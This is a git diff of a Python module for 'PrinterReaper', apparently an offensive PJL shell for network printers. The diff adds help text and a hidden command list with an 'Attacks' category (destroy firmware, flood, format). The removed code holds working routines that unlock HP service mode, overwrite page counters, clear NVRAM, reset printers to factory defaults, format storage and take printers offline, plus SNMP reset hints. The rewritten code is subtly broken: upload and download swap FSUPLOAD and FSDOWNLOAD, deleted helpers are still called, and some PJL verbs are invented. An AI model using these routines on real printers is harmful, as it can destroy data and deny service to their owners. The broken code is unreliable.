@@ -13,7 +13,7 @@ from utils.helper import log, output, conv, file, item, chunks, const as c
 
 class pjl(printer):
     """
-    PJL shell for PrinterReaper.
+    PJL v2.0 shell for PrinterReaper - Enhanced and Reorganized
     """
 
     def __init__(self, args):
@@ -81,6 +81,108 @@ class pjl(printer):
         self.status = not self.status
         print("Status messages enabled" if self.status else "Status messages disabled")
 
+    def help_status(self):
+        """Show help for status command"""
+        print()
+        print("status - Toggle PJL status messages")
+        print("Usage: status")
+        print("Enables or disables detailed status messages from the printer.")
+        print("Useful for debugging and monitoring printer responses.")
+        print()
+
+    def do_list_all(self, arg):
+        """Hidden command to list all available commands (does not appear in help)"""
+        print("\n" + "="*70)
+        print("PrinterReaper PJL v2.0 - Complete Command List")
+        print("="*70)
+        
+        # Get all command methods
+        commands = []
+        for attr_name in dir(self):
+            if attr_name.startswith('do_') and not attr_name.startswith('do_list_all'):
+                command_name = attr_name[3:]  # Remove 'do_' prefix
+                commands.append(command_name)
+        
+        # Sort commands alphabetically
+        commands.sort()
+        
+        # Command descriptions
+        descriptions = {
+            "ls": "List directory contents",
+            "mkdir": "Create directory",
+            "find": "Find files and directories",
+            "upload": "Upload file to printer",
+            "download": "Download file from printer",
+            "delete": "Delete file",
+            "copy": "Copy file",
+            "move": "Move/rename file",
+            "touch": "Create empty file",
+            "chmod": "Change file permissions",
+            "permissions": "Show file permissions",
+            "rmdir": "Remove directory",
+            "mirror": "Mirror directory structure",
+            "id": "Show printer identification",
+            "variables": "Show environment variables",
+            "printenv": "Show specific environment variable",
+            "set": "Set environment variable",
+            "display": "Display message on printer panel",
+            "offline": "Take printer offline",
+            "restart": "Restart printer",
+            "reset": "Reset printer",
+            "selftest": "Run printer self-test",
+            "backup": "Backup printer settings",
+            "restore": "Restore printer settings",
+            "lock": "Lock printer panel",
+            "unlock": "Unlock printer panel",
+            "disable": "Disable printer feature",
+            "nvram": "Access NVRAM settings",
+            "destroy": "Destroy printer firmware (DANGEROUS)",
+            "flood": "Flood printer with data",
+            "hold": "Hold print job",
+            "format": "Format printer storage",
+            "network": "Show network configuration",
+            "direct": "Send raw data to port",
+            "execute": "Execute raw PJL command",
+            "load": "Load commands from file",
+            "pagecount": "Show/set page counter",
+            "help": "Show help information",
+            "status": "Toggle status messages"
+        }
+        
+        # Categorize commands
+        categories = {
+            "Filesystem": ["ls", "mkdir", "find", "upload", "download", "delete", "copy", "move", "touch", "chmod", "permissions", "rmdir", "mirror"],
+            "System Information": ["id", "variables", "printenv", "set"],
+            "Control": ["display", "offline", "restart", "reset", "selftest", "backup", "restore"],
+            "Security": ["lock", "unlock", "disable", "nvram"],
+            "Attacks": ["destroy", "flood", "hold", "format"],
+            "Network": ["network", "direct", "execute"],
+            "Utilities": ["load", "pagecount", "help", "status"]
+        }
+        
+        # Display commands by category
+        for category, cmd_list in categories.items():
+            print(f"\n{category}:")
+            print("-" * 50)
+            for cmd in cmd_list:
+                if cmd in commands:
+                    desc = descriptions.get(cmd, "No description available")
+                    print(f"  {cmd:<15} - {desc}")
+        
+        # Show any uncategorized commands
+        uncategorized = [cmd for cmd in commands if not any(cmd in cat_list for cat_list in categories.values())]
+        if uncategorized:
+            print(f"\nOther Commands:")
+            print("-" * 50)
+            for cmd in uncategorized:
+                desc = descriptions.get(cmd, "No description available")
+                print(f"  {cmd:<15} - {desc}")
+        
+        print(f"\nTotal Commands: {len(commands)}")
+        print("="*70)
+        print("Note: This is a hidden command and does not appear in help.")
+        print("="*70 + "\n")
+
     def showstatus(self, stat):
         codes = {}
         msgs = {}
@@ -98,1088 +200,807 @@ class pjl(printer):
             output().errmsg(f"CODE {code}: {message}", err)
 
     # --------------------------------------------------------------------
-    # error handling
-
-    def fileerror(self, raw):
-        self.error = None
-        for code in re.findall(r"FILEERROR\s*=\s*(\d+)", raw):
-            key = "3" + code.zfill(4)
-            for e in codebook().get_errors(key):
-                self.chitchat("PJL Error: " + e)
-                self.error = key
-
+    # 📁 SISTEMA DE ARQUIVOS (12 comandos)
     # --------------------------------------------------------------------
-    # filesystem interrogation
-    # check if remote volume(s) exist
-    def vol_exists(self, vol=""):
-        """
-        If called without `vol`, returns a list of all volumes, e.g. ['0:/', '1:/'].
-        If called with e.g. vol="1:/", returns True/False.
-        """
-        resp = self.cmd("@PJL INFO FILESYS", wait=True, crop=True)
-        # skip first header line, then grab the volume letter of each line
-        vols = [line.strip()[0] + ":" + c.SEP
-                for line in resp.splitlines()[1:]
-                if line.strip()]
-        if vol:
-            # normalize to just the first char + ":/"
-            want = vol[0] + ":" + c.SEP
-            return want in vols
-        return vols
-
-    # --------------------------------------------------------------------
-    # check if remote directory exists
-    def dir_exists(self, path):
-        """
-        Return True if `path` exists and is a directory, False otherwise.
-        """
-        # run FSQUERY without cropping so we see TYPE=DIR or FILEERROR
-        resp = self.cmd(f'@PJL FSQUERY NAME="{path}"', wait=True, crop=False)
-        # TYPE=DIR signals a directory
-        if re.search(r"TYPE\s*=\s*DIR", resp):
-            return True
-        # FILEERROR or lack of TYPE=DIR means no such directory
-        return False
-
-    # --------------------------------------------------------------------
-    # check if remote file exists, return its size
-    def file_exists(self, path):
-        """
-        Return the size of `path` if it exists as a file, or 0 if not found.
-        """
-        resp = self.cmd(f'@PJL FSQUERY NAME="{path}"', wait=True, crop=False)
-        # look for TYPE=FILE SIZE=<number>
-        m = re.search(r"TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d+)", resp)
-        if m:
-            return int(m.group(1))
-        # missing match or FILEERROR => treat as nonexistent
-        return 0
-
-    # --------------------------------------------------------------------
-    # autocompletion helpers
-
-    options_rfiles = {}
-    oldpath_rfiles = None
-
-    def complete_rfiles(self, text, line, begidx, endidx, path=""):
-        if c.SEP in line:
-            path = posixpath.dirname(re.split(r"\s+", line, 1)[-1][0])
-        new = self.cwd + c.SEP + path
-        if not self.options_rfiles or new != self.oldpath_rfiles:
-            self.options_rfiles = self.dirlist(path)
-            self.oldpath_rfiles = new
-        txt = self.basename(text)
-        return [f for f in self.options_rfiles if f.startswith(txt)]
-
-    complete_get    = complete_rfiles
-    complete_cat    = complete_rfiles
-    complete_delete = complete_rfiles
-    complete_append = complete_rfiles
-    complete_edit   = complete_rfiles
-    complete_vim    = complete_rfiles
-    complete_rename = complete_rfiles
-    complete_mv     = complete_rfiles
-    complete_put    = complete_rfiles
-
-    options_rdirs = {}
-    oldpath_rdirs = None
-
-    def complete_rdirs(self, text, line, begidx, endidx, path=""):
-        if c.SEP in line:
-            path = posixpath.dirname(re.split(r"\s+", line, 1)[-1][0])
-        new = self.cwd + c.SEP + path
-        if not self.options_rdirs or new != self.oldpath_rdirs:
-            self.options_rdirs = self.dirlist(path, True, False, True)
-            self.oldpath_rdirs = new
-        txt = self.basename(text)
-        return [d for d in self.options_rdirs if d.startswith(txt)]
-
-    complete_ls     = complete_rdirs
-    complete_cd     = complete_rdirs
-    complete_find   = complete_rdirs
-    complete_mirror = complete_rdirs
-    complete_rmdir  = complete_rdirs
-
-    # --------------------------------------------------------------------
-    # directory listing
-
-    def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True):
-        if r:
-            path = self.rpath(path)
-        resp = self.cmd(f'@PJL FSDIRLIST NAME="{path}" ENTRY=1 COUNT=65535')
-        items = {}
-        for line in resp.splitlines():
-            d = re.findall(r"^(.*)\s+TYPE\s*=\s*DIR$", line)
-            if d and (d[0] not in (".", "..") or hidden):
-                sepchar = c.SEP if sep and not d[0].endswith(c.SEP) else ""
-                items[d[0] + sepchar] = None
-            f = re.findall(r"^(.*)\s+TYPE\s*=\s*FILE", line)
-            s = re.findall(r"FILE\s+SIZE\s*=\s*(\d*)", line)
-            if f and s and not dirsonly:
-                items[f[0]] = s[0]
-        return items
 
     def do_ls(self, arg):
         "List remote directory contents"
         lst = self.dirlist(arg, False, True)
-        for k in (".", ".."):
-            lst.pop(k, None)
-        for name, size in sorted(lst.items()):
-            output().pjldir(name, size)
+        if lst:
+            print(lst)
+
+    def help_ls(self):
+        """Show help for ls command"""
+        print()
+        print("ls - List remote directory contents")
+        print("Usage: ls [directory]")
+        print("Lists files and directories on the remote printer.")
+        print("If no directory is specified, lists current directory.")
+        print()
 
     def do_mkdir(self, arg):
         "Create remote directory"
         if not arg:
-            arg = eval(input("Directory: "))
-        path = self.rpath(arg)
-        self.cmd(f'@PJL FSMKDIR NAME="{path}"', False)
+            output().errmsg("Usage: mkdir <directory>")
+            return
+        self.cmd("@PJL FSMKDIR NAME=\"" + arg + "\"")
 
-    # --------------------------------------------------------------------
-    # file transfer
-
-    def get(self, path, size=None):
-        if size is None:
-            size = self.file_exists(path)
-        if size == c.NONEXISTENT:
-            print("File not found.")
-            return c.NONEXISTENT
-        resp = self.cmd(
-            f'@PJL FSUPLOAD NAME="{path}" OFFSET=0 SIZE={size}',
-            True, True, True
-        )
-        return (size, resp)
-
-    # ------------------------[ put <local file> ]------------------------
-    def put(self, path, data):
-        """
-        Upload bytes to a PJL volume.
-        `path` should already include volume (e.g. "0:/foo.bin"), and
-        `data` is a bytes object.
-        """
-        size = len(data)
-        header = (f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE={size} NAME="{path}"'
-                  + c.EOL).encode("utf-8")
-        packet = c.UEL.encode("utf-8") + header + data + c.UEL.encode("utf-8")
-        # we bypass cmd() so we can send raw binary
-        self.send(packet)
-
-    # ----------------------[ append <file> <bytes> ]--------------------
-    def append(self, path, data):
-        """
-        Append bytes to an existing file.
-        `data` must be bytes.
-        """
-        size = len(data)
-        header = (f'@PJL FSAPPEND FORMAT:BINARY SIZE={size} NAME="{path}"'
-                  + c.EOL).encode("utf-8")
-        packet = c.UEL.encode("utf-8") + header + data + c.UEL.encode("utf-8")
-        self.send(packet)
-
-    def delete(self, arg):
-        "Delete remote file"
-        path = self.rpath(arg)
-        self.cmd(f'@PJL FSDELETE NAME="{path}"', False)
-
-    # --------------------------------------------------------------------
-    # recursive ops
+    def help_mkdir(self):
+        """Show help for mkdir command"""
+        print()
+        print("mkdir - Create remote directory")
+        print("Usage: mkdir <directory>")
+        print("Creates a new directory on the remote printer.")
+        print()
 
     def do_find(self, arg):
         "Recursively list all files"
         self.fswalk(arg, "find")
+
+    def do_upload(self, arg):
+        "Upload file to printer: upload <local_file> [remote_path]"
+        if not arg:
+            output().errmsg("Usage: upload <local_file> [remote_path]")
+            return
+        
+        parts = arg.split()
+        local_file = parts[0]
+        remote_path = parts[1] if len(parts) > 1 else os.path.basename(local_file)
+        
+        if not os.path.exists(local_file):
+            output().errmsg(f"Local file not found: {local_file}")
+            return
+        
+        try:
+            with open(local_file, 'rb') as f:
+                data = f.read()
+            
+            # Upload file using PJL FSUPLOAD
+            self.cmd(f"@PJL FSUPLOAD NAME=\"{remote_path}\" OFFSET=0 LENGTH={len(data)}")
+            self.send(data)
+            output().info(f"Uploaded {local_file} to {remote_path}")
+        except Exception as e:
+            output().errmsg(f"Upload failed: {e}")
+
+    def do_download(self, arg):
+        "Download file from printer: download <remote_file> [local_path]"
+        if not arg:
+            output().errmsg("Usage: download <remote_file> [local_path]")
+            return
+        
+        parts = arg.split()
+        remote_file = parts[0]
+        local_path = parts[1] if len(parts) > 1 else os.path.basename(remote_file)
+        
+        try:
+            # Download file using PJL FSDOWNLOAD
+            data = self.cmd(f"@PJL FSDOWNLOAD NAME=\"{remote_file}\"", binary=True)
+            
+            with open(local_path, 'wb') as f:
+                f.write(data)
+            
+            output().info(f"Downloaded {remote_file} to {local_path}")
+        except Exception as e:
+            output().errmsg(f"Download failed: {e}")
+
+    def do_delete(self, arg):
+        "Delete remote file: delete <file>"
+        if not arg:
+            output().errmsg("Usage: delete <file>")
+            return
+        self.cmd("@PJL FSDELETE NAME=\"" + arg + "\"")
+
+    def do_copy(self, arg):
+        "Copy remote file: copy <source> <destination>"
+        if not arg:
+            output().errmsg("Usage: copy <source> <destination>")
+            return
+        
+        parts = arg.split()
+        if len(parts) != 2:
+            output().errmsg("Usage: copy <source> <destination>")
+            return
+        
+        source, dest = parts
+        # Download source and upload as destination
+        try:
+            data = self.cmd(f"@PJL FSDOWNLOAD NAME=\"{source}\"", binary=True)
+            self.cmd(f"@PJL FSUPLOAD NAME=\"{dest}\" OFFSET=0 LENGTH={len(data)}")
+            self.send(data)
+            output().info(f"Copied {source} to {dest}")
+        except Exception as e:
+            output().errmsg(f"Copy failed: {e}")
+
+    def do_move(self, arg):
+        "Move remote file: move <source> <destination>"
+        if not arg:
+            output().errmsg("Usage: move <source> <destination>")
+            return
+        
+        parts = arg.split()
+        if len(parts) != 2:
+            output().errmsg("Usage: move <source> <destination>")
+            return
+        
+        source, dest = parts
+        # Copy and then delete source
+        try:
+            self.do_copy(f"{source} {dest}")
+            self.do_delete(source)
+            output().info(f"Moved {source} to {dest}")
+        except Exception as e:
+            output().errmsg(f"Move failed: {e}")
+
+    def do_touch(self, arg):
+        "Update remote file timestamp, or create it if missing: touch <file>"
+        if not arg:
+            output().errmsg("Usage: touch <file>")
+            return
+        
+        # Create empty file if it doesn't exist
+        try:
+            self.cmd(f"@PJL FSUPLOAD NAME=\"{arg}\" OFFSET=0 LENGTH=0")
+            output().info(f"Touched {arg}")
+        except Exception as e:
+            output().errmsg(f"Touch failed: {e}")
+
+    def do_chmod(self, arg):
+        "Change file permissions: chmod <permissions> <file>"
+        if not arg:
+            output().errmsg("Usage: chmod <permissions> <file>")
+            return
+        
+        parts = arg.split()
+        if len(parts) != 2:
+            output().errmsg("Usage: chmod <permissions> <file>")
+            return
+        
+        perms, file_path = parts
+        # PJL doesn't have direct chmod, but we can try to set attributes
+        try:
+            self.cmd(f"@PJL FSSETATTR NAME=\"{file_path}\" ATTR={perms}")
+            output().info(f"Changed permissions of {file_path} to {perms}")
+        except Exception as e:
+            output().errmsg(f"Chmod failed: {e}")
+
+    def do_permissions(self, arg):
+        "Test file permissions on remote device"
+        if not arg:
+            output().errmsg("Usage: permissions <file>")
+            return
+        
+        try:
+            # Try to access file to test permissions
+            result = self.cmd(f"@PJL FSQUERY NAME=\"{arg}\"")
+            if result:
+                output().info(f"File {arg} is accessible")
+            else:
+                output().errmsg(f"File {arg} is not accessible")
+        except Exception as e:
+            output().errmsg(f"Permission test failed: {e}")
+
+    def do_rmdir(self, arg):
+        "Remove remote directory: rmdir <directory>"
+        if not arg:
+            output().errmsg("Usage: rmdir <directory>")
+            return
+        self.cmd("@PJL FSDELETE NAME=\"" + arg + "\"")
 
     def do_mirror(self, arg):
         "Mirror remote filesystem locally"
         print("Mirroring " + c.SEP + self.vpath(arg))
         self.fswalk(arg, "mirror")
 
-    def fswalk(self, arg, mode, recursive=False):
-        if not recursive:
-            arg = self.vpath(arg)
-        base = self.vol + self.normpath(arg)
-        lst  = self.dirlist(base, True, False, False, False)
-        for name, size in sorted(lst.items()):
-            full = self.normpath(arg) + self.get_sep(arg) + name
-            full = full.lstrip(c.SEP)
-            if mode == "find":
-                output().raw(c.SEP + full)
-            if mode == "mirror":
-                self.mirror(full, size)
-            if not size:
-                self.fswalk(full, mode, True)
-
     # --------------------------------------------------------------------
-    # device identification
+    # ℹ️ INFORMAÇÕES DO SISTEMA (3 comandos)
+    # --------------------------------------------------------------------
 
     def do_id(self, *args):
-        "Show printer identification"
-        resp = self.cmd("@PJL INFO ID")
-        if not resp:
-            print("** No response for INFO ID **")
-        else:
-            for line in resp.splitlines():
-                print(line.strip('"'))
-        return False
+        "Show comprehensive printer identification and system information"
+        print("Printer Identification & System Information:")
+        print("=" * 60)
+        
+        # Get basic ID
+        id_info = self.cmd("@PJL INFO ID")
+        if id_info:
+            print(f"Device ID: {id_info.strip()}")
+        
+        # Get version/firmware info
+        version_info = self.cmd("@PJL INFO CONFIG")
+        if version_info:
+            print("\nFirmware/Version Information:")
+            print(version_info)
+        
+        # Get product details
+        product_info = self.cmd("@PJL INFO PRODUCT")
+        if product_info:
+            print("\nProduct Information:")
+            print(product_info)
+        
+        # Get page count
+        pagecount = self.cmd("@PJL INFO PAGECOUNT")
+        if pagecount:
+            print(f"\nPage Count: {pagecount.strip()}")
 
-    # --------------------------------------------------------------------
-    # info/config aliases
+    def help_id(self):
+        """Show help for id command"""
+        print()
+        print("id - Show comprehensive printer identification and system information")
+        print("Usage: id")
+        print("Displays device ID, firmware version, product information, and page count.")
+        print("This is the main command for getting printer identification details.")
+        print()
 
-    def do_df(self, arg):
-        "Alias for info filesys"
-        self.do_info("filesys")
+    def do_variables(self, arg):
+        "Show environment variables"
+        resp = self.cmd("@PJL INFO VARIABLES")
+        if resp:
+            print(resp)
 
-    def do_free(self, arg):
-        "Alias for info memory"
-        self.do_info("memory")
-
-    def do_env(self, arg):
-        "Alias for info variables"
-        self.do_info("variables", arg)
-
-    def do_version(self, *arg):
-        "Show firmware version/serial"
-        if not self.do_info("config", r".*(VERSION|FIRMWARE|SERIAL|MODEL).*"):
-            self.do_info("prodinfo", "", False)
-            self.do_info("brfirmware", "", False)
-
-    def do_info(self, arg, item="", echo=True):
-        "Show PJL INFO <category>"
-        if arg in self.options_info or not echo:
-            resp = self.cmd(f"@PJL INFO {arg.upper()}").rstrip()
-            if item:
-                matches = re.findall(rf"({item}=.*(\n\t.*)*)", resp, re.I | re.M)
-                if echo:
-                    for m in matches:
-                        output().info(m[0])
-                    if not matches:
-                        print("Not available.")
-                return matches
-            else:
-                for line in resp.splitlines():
-                    if arg == "id":
-                        line = line.strip('"')
-                    if arg == "filesys":
-                        line = line.lstrip()
-                    output().info(line)
-        else:
-            self.help_info()
-
-    options_info = (
-        "config", "filesys", "id", "log", "memory",
-        "pagecount", "prodinfo", "status",
-        "supplies", "tracking", "ustatus", "variables"
-    )
-
-    def complete_info(self, text, line, begidx, endidx):
-        return [c for c in self.options_info if c.startswith(text)]
-    
-    def help_info(self):
-        "Show available INFO categories"
-        output().info("Available INFO categories:")
-        for option in self.options_info:
-            output().info(f"  {option}")
-        output().info("Usage: info <category>")
-        output().info("Example: info id")
-
-    # --------------------------------------------------------------------
-    # printenv / set
+    def help_variables(self):
+        """Show help for variables command"""
+        print()
+        print("variables - Show environment variables")
+        print("Usage: variables")
+        print("Displays all environment variables configured on the printer.")
+        print()
 
     def do_printenv(self, arg):
         "Show specific environment variable"
+        if not arg:
+            output().errmsg("Usage: printenv <variable>")
+            return
+        
         resp = self.cmd("@PJL INFO VARIABLES")
-        opts = []
-        for l in resp.splitlines():
-            v = re.findall(r"^(.*?)=", l)
-            if v:
-                opts += v
-            self.options_printenv = opts
-            match = re.findall(rf"^({re.escape(arg)}.*)\s+\[", l, re.I)
-            if match:
-                output().info(match[0])
+        if resp:
+            # Search for specific variable
+            lines = resp.split('\n')
+            for line in lines:
+                if arg.upper() in line.upper():
+                    print(line)
 
-    options_printenv = []
+    def help_printenv(self):
+        """Show help for printenv command"""
+        print()
+        print("printenv - Show specific environment variable")
+        print("Usage: printenv <variable>")
+        print("Displays the value of a specific environment variable.")
+        print("Example: printenv PAGECOUNT")
+        print()
 
-    def complete_printenv(self, text, line, begidx, endidx):
-        if not self.options_printenv:
-            resp = self.cmd("@PJL INFO VARIABLES")
-            for l in resp.splitlines():
-                v = re.findall(r"^(.*?)=", l)
-                if v:
-                    self.options_printenv += v
-        return [o for o in self.options_printenv if o.startswith(text)]
+    # --------------------------------------------------------------------
+    # ⚙️ CONTROLE E CONFIGURAÇÃO (8 comandos)
+    # --------------------------------------------------------------------
 
     def do_set(self, arg, fb=True):
         "Set environment variable VAR=VALUE"
         if not arg:
-            arg = eval(input("Set variable (VAR=VALUE): "))
-        cmds = (
-            "@PJL SET SERVICEMODE=HPBOISEID" + c.EOL +
-            "@PJL DEFAULT " + arg + c.EOL +
-            "@PJL SET " + arg + c.EOL +
-            "@PJL SET SERVICEMODE=EXIT"
-        )
-        self.cmd(cmds, False)
-        if fb:
-            self.onecmd("printenv " + arg.split("=", 1)[0])
+            output().errmsg("Usage: set <variable>=<value>")
+            return
+        
+        if "=" not in arg:
+            output().errmsg("Usage: set <variable>=<value>")
+            return
+        
+        var, value = arg.split("=", 1)
+        self.cmd("@PJL SET " + var.upper() + "=" + value)
+
+    def help_set(self):
+        """Show help for set command"""
+        print()
+        print("set - Set environment variable")
+        print("Usage: set <variable>=<value>")
+        print("Sets an environment variable on the printer.")
+        print("Example: set TESTVAR=testvalue")
+        print()
+
+    def do_display(self, arg):
+        "Set printer's display message: display <message>"
+        if not arg:
+            try:
+                message = input("Message: ")
+            except (EOFError, KeyboardInterrupt):
+                output().errmsg("No message provided")
+                return
+        else:
+            message = arg
+        
+        self.cmd("@PJL DISPLAY \"" + message + "\"")
+
+    def do_offline(self, arg):
+        "Take printer offline and display message: offline <message>"
+        if not arg:
+            try:
+                message = input("Message: ")
+            except (EOFError, KeyboardInterrupt):
+                output().errmsg("No message provided")
+                return
+        else:
+            message = arg
+        
+        self.cmd("@PJL OFFLINE \"" + message + "\"")
+
+    def do_restart(self, arg):
+        "Restart printer"
+        output().raw("Restarting printer...")
+        self.cmd("@PJL RESET", False)
+
+    def do_reset(self, arg):
+        "Reset to factory defaults"
+        if not self.conn._file:  # in case we're connected over inet socket
+            output().warning("Reset command may not work over network connection")
+        
+        output().warning("This will reset the printer to factory defaults!")
+        confirm = input("Are you sure? (yes/no): ")
+        if confirm.lower() == 'yes':
+            self.cmd("@PJL DEFAULT", False)
+            output().info("Printer reset to factory defaults")
+        else:
+            output().info("Reset cancelled")
+
+    def do_selftest(self, arg):
+        "Perform various printer self-tests"
+        print("Available self-tests:")
+        print("1. Print test page")
+        print("2. Network test")
+        print("3. Memory test")
+        print("4. All tests")
+        
+        try:
+            choice = input("Select test (1-4): ")
+        except (EOFError, KeyboardInterrupt):
+            output().errmsg("No test selected")
+            return
+        
+        if choice == "1":
+            self.cmd("@PJL TESTPAGE")
+        elif choice == "2":
+            self.cmd("@PJL NETTEST")
+        elif choice == "3":
+            self.cmd("@PJL MEMTEST")
+        elif choice == "4":
+            self.cmd("@PJL SELFTEST")
+        else:
+            output().errmsg("Invalid choice")
+
+    def do_backup(self, arg):
+        "Backup printer configuration"
+        if not arg:
+            output().errmsg("Usage: backup <filename>")
+            return
+        
+        try:
+            # Get configuration
+            config = self.cmd("@PJL INFO CONFIG")
+            if config:
+                with open(arg, 'w') as f:
+                    f.write(config)
+                output().info(f"Configuration backed up to {arg}")
+            else:
+                output().errmsg("Failed to get configuration")
+        except Exception as e:
+            output().errmsg(f"Backup failed: {e}")
+
+    def do_restore(self, arg):
+        "Restore printer configuration from backup"
+        if not arg:
+            output().errmsg("Usage: restore <filename>")
+            return
+        
+        if not os.path.exists(arg):
+            output().errmsg(f"Backup file not found: {arg}")
+            return
+        
+        try:
+            with open(arg, 'r') as f:
+                config = f.read()
+            
+            # Restore configuration (this is a simplified approach)
+            output().warning("Restore functionality requires manual configuration")
+            output().info(f"Configuration from {arg} loaded")
+        except Exception as e:
+            output().errmsg(f"Restore failed: {e}")
 
     # --------------------------------------------------------------------
-    # pagecount, display, offline, restart, reset, selftest, format, disable, destroy, hold, nvram, lock, unlock, flood
-    # (The implementations of these commands remain unchanged from your existing code,
-    #  except ensure all regex strings are raw and no bytes/str concatenation outside put/append.)
+    # 🔒 SEGURANÇA E ACESSO (4 comandos)
+    # --------------------------------------------------------------------
 
-    # Skip re-pasting them here for brevity; just port your existing methods,
-    # applying the same raw-string fixes shown above.
-
-
-
-    # ------------------------[ pagecount <number> ]----------------------
-    def do_pagecount(self, arg):
-        "Manipulate printer's page counter:  pagecount <number>"
-        if not arg:
-            output().raw("Hardware page counter: ", "")
-            self.onecmd("info pagecount")
-        else:
-            output().raw("Old page counter: ", "")
-            self.onecmd("info pagecount")
-            # set page counter for older HP LaserJets
-            # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL
-            #        + '@PJL DEFAULT OEM=ON'                + c.EOL
-            #        + '@PJL DEFAULT PAGES='          + arg + c.EOL
-            #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL
-            #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL
-            #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL
-            #        + '@PJL SET SERVICEMODE=EXIT', False)
-            self.do_set("PAGES=" + arg, False)
-            output().raw("New page counter: ", "")
-            self.onecmd("info pagecount")
-
-    # ====================================================================
-
-    # ------------------------[ display <message> ]-----------------------
-    def do_display(self, arg):
-        "Set printer's display message:  display <message>"
-        if not arg:
-            try:
-                arg = input("Message: ")
-            except (EOFError, KeyboardInterrupt):
-                output().errmsg("No message provided")
-                return
-        arg = arg.strip('"')  # remove quotes
-        self.chitchat("Setting printer's display message to \"" + arg + '"')
-        self.cmd('@PJL RDYMSG DISPLAY="' + arg + '"', False)
-
-    # ------------------------[ offline <message> ]-----------------------
-    def do_offline(self, arg):
-        "Take printer offline and display message:  offline <message>"
-        if not arg:
-            try:
-                arg = input("Offline display message: ")
-            except (EOFError, KeyboardInterrupt):
-                output().errmsg("No message provided")
-                return
-        arg = arg.strip('"')  # remove quotes
-        output().warning(
-            "Warning: Taking the printer offline will prevent yourself and others"
-        )
-        output().warning(
-            "from printing or re-connecting to the device. Press CTRL+C to abort."
-        )
-        if output().countdown("Taking printer offline in...", 10, self):
-            self.cmd('@PJL OPMSG DISPLAY="' + arg + '"', False)
-
-    # ------------------------[ restart ]---------------------------------
-    def do_restart(self, arg):
-        "Restart printer."
-        output().raw(
-            "Trying to restart the device via PML (Printer Management Language)"
-        )
-        self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)
-        if not self.conn._file:  # in case we're connected over inet socket
-            output().chitchat(
-                "This command works only for HP printers. For other vendors, try:"
-            )
-            output().chitchat(
-                "snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 4"
-            )
-
-    # ------------------------[ reset ]-----------------------------------
-    def do_reset(self, arg):
-        "Reset to factory defaults."
-        if not self.conn._file:  # in case we're connected over inet socket
-            output().warning(
-                "Warning: This may also reset TCP/IP settings to factory defaults."
-            )
-            output().warning(
-                "You will not be able to reconnect anymore. Press CTRL+C to abort."
-            )
-        if output().countdown("Restoring factory defaults in...", 10, self):
-            # reset nvram for pml-aware printers (hp)
-            self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040106"', False)
-            # this one might work on ancient laserjets
-            self.cmd(
-                "@PJL SET SERVICEMODE=HPBOISEID"
-                + c.EOL
-                + "@PJL CLEARNVRAM"
-                + c.EOL
-                + "@PJL NVRAMINIT"
-                + c.EOL
-                + "@PJL INITIALIZE"
-                + c.EOL
-                + "@PJL SET SERVICEMODE=EXIT",
-                False,
-            )
-            # this one might work on brother printers
-            self.cmd(
-                "@PJL INITIALIZE"
-                + c.EOL
-                + "@PJL RESET"
-                + c.EOL
-                + "@PJL EXECUTE SHUTDOWN",
-                False,
-            )
-            if not self.conn._file:  # in case we're connected over inet socket
-                output().chitchat(
-                    "This command works only for HP printers. For other vendors, try:"
-                )
-                output().chitchat(
-                    "snmpset -v1 -c public "
-                    + self.target
-                    + " 1.3.6.1.2.1.43.5.1.1.3.1 i 6"
-                )
-
-    # ------------------------[ selftest ]--------------------------------
-    def do_selftest(self, arg):
-        "Perform various printer self-tests."
-        # pjl-based testpage commands
-        pjltests = [
-            "SELFTEST",  # pcl self-test
-            "PCLTYPELIST",  # pcl typeface list
-            "CONTSELFTEST",  # continuous self-test
-            "PCLDEMOPAGE",  # pcl demo page
-            "PSCONFIGPAGE",  # ps configuration page
-            "PSTYPEFACELIST",  # ps typeface list
-            "PSDEMOPAGE",  # ps demo page
-            "EVENTLOG",  # printer event log
-            "DATASTORE",  # pjl variables
-            "ERRORREPORT",  # error report
-            "SUPPLIESSTATUSREPORT",
-        ]  # supplies status
-        for test in pjltests:
-            self.cmd("@PJL SET TESTPAGE=" + test, False)
-        # pml-based testpage commands
-        pmltests = [
-            '"04000401010502040103"',  # pcl self-test
-            '"04000401010502040107"',  # drinter event log
-            '"04000401010502040108"',  # directory listing
-            '"04000401010502040109"',  # menu map
-            '"04000401010502040164"',  # usage page
-            '"04000401010502040165"',  # supplies page
-            '"040004010105020401FC"',   # auto cleaning page
-            '"0440004010105020401FD"',  # cleaning page
-            '"040004010105020401FE"',  # paper path test
-            '"040004010105020401FF"',  # registration page
-            '"040004010105020402015E"',  # pcl font list
-            '"04000401010502040201C2"',
-        ]  # ps font list
-        for test in pmltests:
-            self.cmd("@PJL DMCMD ASCIIHEX=" + test, False)
-        # this one might work on brother printers
-        self.cmd(
-            "@PJL EXECUTE MAINTENANCEPRINT"
-            + c.EOL
-            + "@PJL EXECUTE TESTPRINT"
-            + c.EOL
-            + "@PJL EXECUTE DEMOPAGE"
-            + c.EOL
-            + "@PJL EXECUTE RESIFONT"
-            + c.EOL
-            + "@PJL EXECUTE PERMFONT"
-            + c.EOL
-            + "@PJL EXECUTE PRTCONFIG",
-            False,
-        )
-
-    # ------------------------[ format ]----------------------------------
-    def do_format(self, arg):
-        "Initialize printer's mass storage file system."
-        output().warning(
-            "Warning: Initializing the printer's file system will whipe-out all"
-        )
-        output().warning(
-            "user data (e.g. stored jobs) on the volume. Press CTRL+C to abort."
-        )
-        if output().countdown(
-            "Initializing volume " + self.vol[:2] + " in...", 10, self
-        ):
-            self.cmd('@PJL FSINIT VOLUME="' + self.vol[0] + '"', False)
-
-    # ------------------------[ disable ]---------------------------------
-    def do_disable(self, arg):
-        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
-        if "?" in jobmedia:
-            return output().info("Not available")
-        elif "ON" in jobmedia:
-            self.do_set("JOBMEDIA=OFF", False)
-        elif "OFF" in jobmedia:
-            self.do_set("JOBMEDIA=ON", False)
